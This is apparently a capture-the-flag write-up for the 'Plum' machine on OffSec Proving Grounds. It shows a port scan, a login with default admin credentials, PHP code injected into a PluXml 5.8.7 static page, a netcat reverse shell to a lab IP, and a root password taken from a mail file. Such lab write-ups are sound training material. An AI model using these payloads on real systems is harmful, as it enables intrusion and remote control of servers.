# Plum

## Info

Plum is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
```

## User

PluXml 5.8.7 is vulnerable to code injection.

Sign in as admin.

```
admin:admin
```

Go to the static pages section, edit the page with the following.

```
<?php system("id"); ?>
```

After selecting see next to the edit button this shows code execution and the user is www-data.

Get a nc shell.

```
nc -lvnp 80
```

```
<?php system("nc -e /bin/bash 192.168.45.218 80"); ?>
```

## Root

There is an email in /var/mail stating a ddos attack is happening and the root credentials are given to the pentester.

```
root:6s8kaZZNaZZYBMfh2YEW
```
